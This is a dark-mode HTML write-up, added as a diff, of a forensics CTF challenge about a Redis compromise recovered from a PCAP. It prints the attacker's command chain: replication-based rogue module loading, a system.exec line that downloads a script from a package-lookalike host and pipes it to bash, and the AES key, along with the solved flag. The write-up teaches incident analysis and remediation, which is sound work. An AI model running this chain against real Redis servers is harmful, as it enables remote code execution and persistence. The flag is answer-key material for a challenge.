@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HTB Red — CTF Writeup</title>
+  <style>
+:root {
+  --bg: #080b10;
+  --panel: #101722;
+  --panel2: #0d131d;
+  --text: #e8eef7;
+  --muted: #9fb0c5;
+  --subtle: #6d7d91;
+  --accent: #67e8f9;
+  --accent2: #a78bfa;
+  --good: #34d399;
+  --warn: #fbbf24;
+  --bad: #fb7185;
+  --code: #07111d;
+  --border: #223044;
+  --shadow: rgba(0,0,0,.35);
+}
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  color: var(--text);
+  background:
+    radial-gradient(circle at top left, rgba(103,232,249,.16), transparent 34rem),
+    radial-gradient(circle at top right, rgba(167,139,250,.14), transparent 28rem),
+    linear-gradient(180deg, #070a0f 0%, #0a0f16 45%, #070a0f 100%);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.6;
+}
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; }
+.container { width: min(1120px, calc(100% - 40px)); margin: 0 auto; }
+.hero {
+  padding: 56px 0 32px;
+  border-bottom: 1px solid rgba(255,255,255,.06);
+}
+.kicker {
+  display: inline-flex;
+  gap: 8px;
+  align-items: center;
+  color: var(--accent);
+  font-weight: 700;
+  letter-spacing: .12em;
+  text-transform: uppercase;
+  font-size: .78rem;
+}
+.kicker::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 20px var(--accent); }
+h1 { font-size: clamp(2.2rem, 5vw, 4.6rem); line-height: .95; margin: 18px 0 18px; letter-spacing: -.05em; }
+.subtitle { color: var(--muted); max-width: 860px; font-size: 1.08rem; }
+.meta-grid { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 14px; margin-top: 28px; }
+.meta-card { background: rgba(16,23,34,.74); border: 1px solid var(--border); border-radius: 18px; padding: 16px; box-shadow: 0 12px 40px var(--shadow); backdrop-filter: blur(10px); }
+.meta-label { color: var(--subtle); font-size: .76rem; text-transform: uppercase; letter-spacing: .12em; }
+.meta-value { margin-top: 5px; font-weight: 800; overflow-wrap: anywhere; }
+.flag-card { margin-top: 24px; border: 1px solid rgba(52,211,153,.35); background: linear-gradient(135deg, rgba(52,211,153,.14), rgba(103,232,249,.08)); border-radius: 22px; padding: 20px; }
+.flag-label { color: var(--good); font-weight: 800; text-transform: uppercase; font-size: .8rem; letter-spacing: .12em; }
+.flag { margin-top: 8px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; font-size: clamp(1rem, 2.4vw, 1.35rem); overflow-wrap: anywhere; }
+.layout { display: grid; grid-template-columns: 260px minmax(0, 1fr); gap: 28px; padding: 34px 0 70px; }
+.toc { position: sticky; top: 18px; align-self: start; background: rgba(13,19,29,.76); border: 1px solid var(--border); border-radius: 20px; padding: 18px; }
+.toc-title { color: var(--muted); font-size: .78rem; font-weight: 800; letter-spacing: .12em; text-transform: uppercase; margin-bottom: 10px; }
+.toc a { display: block; color: var(--muted); padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,.045); font-size: .92rem; }
+.toc a:last-child { border-bottom: 0; }
+.content { min-width: 0; }
+section { background: rgba(16,23,34,.68); border: 1px solid var(--border); border-radius: 22px; padding: 26px; margin-bottom: 22px; box-shadow: 0 18px 45px var(--shadow); }
+h2 { margin: 0 0 14px; font-size: 1.72rem; letter-spacing: -.03em; }
+h3 { margin: 24px 0 10px; color: #dce6f5; }
+p, li { color: #c8d4e4; }
+ul, ol { padding-left: 1.35rem; }
+hr { border: 0; border-top: 1px solid var(--border); margin: 22px 0; }
+code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
+code { background: rgba(7,17,29,.8); color: #d8f8ff; padding: .14rem .34rem; border-radius: 7px; border: 1px solid rgba(103,232,249,.13); }
+pre { background: var(--code); color: #d6e9ff; padding: 18px; border-radius: 16px; overflow-x: auto; border: 1px solid rgba(103,232,249,.14); box-shadow: inset 0 0 0 1px rgba(255,255,255,.02); }
+.callout { border-left: 4px solid var(--accent); background: rgba(103,232,249,.08); padding: 14px 16px; border-radius: 12px; color: #d9f8ff; margin: 16px 0; }
+.callout.good { border-left-color: var(--good); background: rgba(52,211,153,.08); }
+.callout.warn { border-left-color: var(--warn); background: rgba(251,191,36,.08); }
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; margin: 14px 0; }
+th, td { border-bottom: 1px solid var(--border); padding: 10px 10px; text-align: left; vertical-align: top; }
+th { color: #eef6ff; background: rgba(255,255,255,.035); font-size: .86rem; text-transform: uppercase; letter-spacing: .07em; }
+td { color: #c8d4e4; }
+.badge { display: inline-flex; align-items: center; gap: 6px; border: 1px solid rgba(103,232,249,.25); background: rgba(103,232,249,.08); color: var(--accent); border-radius: 999px; padding: 4px 10px; font-size: .82rem; font-weight: 700; }
+.footer { color: var(--subtle); font-size: .9rem; padding: 26px 0 46px; border-top: 1px solid rgba(255,255,255,.06); }
+@media (max-width: 900px) {
+  .meta-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  .layout { grid-template-columns: 1fr; }
+  .toc { position: static; }
+}
+@media (max-width: 560px) { .meta-grid { grid-template-columns: 1fr; } .container { width: min(100% - 24px, 1120px); } section { padding: 20px; } }
+</style>
+</head>
+<body>
+  <header class="hero">
+    <div class="container">
+      <div class="kicker">Polished CTF Writeup</div>
+      <h1>HTB Red</h1>
+      <p class="subtitle">A forensic Redis compromise investigation involving PCAP analysis, rogue module loading, payload deobfuscation, AES-CBC encrypted command output, and three-part flag assembly.</p>
+      <div class="meta-grid"><div class="meta-card"><div class="meta-label">Category</div><div class="meta-value">Forensics</div></div>
+<div class="meta-card"><div class="meta-label">Difficulty</div><div class="meta-value">Hard</div></div>
+<div class="meta-card"><div class="meta-label">Technique</div><div class="meta-value">Redis protocol + module RE</div></div>
+<div class="meta-card"><div class="meta-label">Artifact</div><div class="meta-value">capture.pcap</div></div></div>
+      <div class="flag-card"><div class="flag-label">Recovered Flag</div><div class="flag">HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}</div></div>
+    </div>
+  </header>
+  <main class="container layout">
+    <nav class="toc"><div class="toc-title">Contents</div><a href="#overview">Overview</a>
+<a href="#pcap">PCAP Triage</a>
+<a href="#redis">Redis Attack Path</a>
+<a href="#payload">HTTP Payload</a>
+<a href="#module">Rogue Module Analysis</a>
+<a href="#parts">Flag Parts</a>
+<a href="#timeline">Incident Timeline</a>
+<a href="#remediation">Remediation</a></nav>
+    <article class="content"><section id="overview"><h2>Overview</h2><p><strong>Red</strong> was a forensic challenge centered on suspicious activity against a password-protected Redis instance. The challenge note warned that the flag was composed of three parts, which guided the investigation: look for separate evidence fragments rather than a single obvious string.</p><p>The PCAP ultimately showed a Redis replication/module abuse chain and encrypted command-output channel.</p></section>
+<section id="pcap"><h2>PCAP Triage</h2><p>The archive contained an encrypted PCAP:</p><pre><code>capture.pcap</code></pre><p>After extraction with the standard HTB password, protocol profiling showed Redis traffic on <code>6379</code> plus HTTP staging from:</p><pre><code>files.pypi-install.com</code></pre><p>Useful forensic commands included conversation profiling, TCP stream following, and Redis command extraction via <code>tshark</code>.</p></section>
+<section id="redis"><h2>Redis Attack Path</h2><p>The Redis stream showed the attacker authenticated, converted the target into a replica, wrote a shared object to disk, and loaded it as a Redis module.</p><pre><code>AUTH ...
+SLAVEOF 10.10.0.15 6379
+CONFIG SET DIR /data
+CONFIG SET dbfilename x10SPFHN.so
+MODULE LOAD ./x10SPFHN.so
+SLAVEOF NO ONE
+CONFIG SET dbfilename dump.rdb
+system.exec rm -v ./x10SPFHN.so
+system.exec uname -a
+system.exec wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
+MODULE UNLOAD system</code></pre><div class="callout"><strong>Impact:</strong> password protection did not prevent compromise once credentials were known. Redis module loading enabled arbitrary code execution inside the Redis process context.</div></section>
+<section id="payload"><h2>HTTP Payload</h2><p>An HTTP payload was fetched from:</p><pre><code>http://files.pypi-install.com/packages/VgLy8V0Zxo</code></pre><p>The script was obfuscated through shell variable/eval layers. It was decoded statically, without executing it. The deobfuscated behavior included appending an SSH key for persistence and staging additional commands.</p><p>The SSH key append payload contained the first flag fragment.</p></section>
+<section id="module"><h2>Rogue Module Analysis</h2><p>The Redis replication stream contained the malicious shared object. It was carved as:</p><pre><code>redis_module.so</code></pre><p>Module hash:</p><pre><code>6f759697b476123dd708c2c2d39c91b245701488dabba10cc836c365cb567906</code></pre><p>Exported symbols included:</p><pre><code>RedisModule_OnLoad
+DoCommand</code></pre><p>The module registered a Redis command:</p><pre><code>system.exec</code></pre><p>Disassembly showed use of <code>popen</code> and OpenSSL AES routines. The command output was encrypted before being sent back over Redis. The AES parameters recovered from the module were:</p><pre><code>key = h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz
+iv  = YDP7ECjzuV7sagMN</code></pre><p>Captured hex ciphertext responses were decrypted with AES-256-CBC to recover command output and the final flag fragment.</p></section>
+<section id="parts"><h2>Flag Parts</h2><p>The challenge specified three parts, and they were recovered from three separate places:</p><div class="table-wrap"><table><tr><th>Part</th><th>Source</th><th>Recovered Text</th></tr><tr><td>1</td><td>Decoded HTTP staged shell payload / SSH key append</td><td><code>HTB{r3d15_1n574nc35</code></td></tr><tr><td>2</td><td>Redis replicated key/value data</td><td><code>_c0uld_0p3n_n3w</code></td></tr><tr><td>3</td><td>Decrypted <code>system.exec</code> command output</td><td><code>_un3xp3c73d_7r41l5!}</code></td></tr></table></div><p>Assembled:</p><pre><code>HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}</code></pre></section>
+<section id="timeline"><h2>Incident Timeline</h2><ol><li>Attacker authenticates to Redis.</li><li>Attacker uses Redis replication to transfer a malicious <code>.so</code> module.</li><li>Redis writes the module to disk using <code>CONFIG SET DIR</code> and <code>dbfilename</code>.</li><li>Attacker loads the rogue module with <code>MODULE LOAD</code>.</li><li>The module exposes <code>system.exec</code> for command execution.</li><li>Command results are encrypted with AES-CBC and returned through Redis.</li><li>Attacker fetches a shell payload from a package-looking domain.</li><li>Payload establishes persistence via SSH key and additional shell activity.</li><li>Attacker unloads/removes the module to reduce obvious traces.</li></ol></section>
+<section id="remediation"><h2>Remediation</h2><ul><li>Rotate Redis credentials and investigate how the password was obtained.</li><li>Disable or tightly restrict <code>MODULE LOAD</code>, <code>CONFIG</code>, and replication commands where possible.</li><li>Bind Redis to trusted interfaces only; avoid public exposure.</li><li>Review filesystem for rogue <code>.so</code> files, temporary payloads, modified SSH keys, and MOTD/profile hooks.</li><li>Hunt for outbound requests to suspicious package-looking domains.</li><li>Collect process, shell history, Redis logs, and persistence artifacts before cleanup.</li></ul></section></article>
+  </main>
+  <footer class="container footer">Generated as a standalone dark-mode HTML writeup. All analysis described here was performed against authorized HTB/CTF challenge artifacts.</footer>
+</body>
+</html>
